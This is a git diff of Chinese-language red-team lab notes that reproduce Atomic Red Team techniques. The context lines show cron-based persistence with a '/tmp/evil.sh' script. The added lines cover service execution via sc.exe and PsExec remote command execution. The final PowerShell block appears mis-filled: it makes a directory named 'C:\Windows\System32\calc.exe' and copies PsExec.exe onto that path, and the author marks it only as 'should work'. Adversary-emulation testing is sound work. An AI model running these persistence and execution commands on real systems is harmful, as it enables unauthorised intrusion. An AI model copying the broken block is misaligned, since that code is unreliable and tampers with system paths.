@@ -163,3 +163,24 @@ echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
 echo "#{command}" > /etc/cron.daily/#{cron_script_name}
 ```
 成功复现
+### T1035 - Service Execution
+红队可以通过windows服务来运行代码
+###### 测试1 Execute a Command as a Service
+```
+sc.exe create mortytest binPath= E:\pythonProject\atomic-red-team\atomics\T1050\bin\AtomicService.exe
+sc.exe start mortytest
+sc.exe delete mortytest
+```
+window10运行成功
+###### 测试2 Use PsExec to execute a command on a remote host
+```
+PsExec.exe \\localhost "C:\Windows\System32\calc.exe"
+```
+window10成功复现
+```
+Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+New-Item -ItemType Directory ("C:\Windows\System32\calc.exe") -Force | Out-Null
+Copy-Item $env:TEMP\PsTools\PsExec.exe "C:\Windows\System32\calc.exe" -Force
+```
+应该是可以
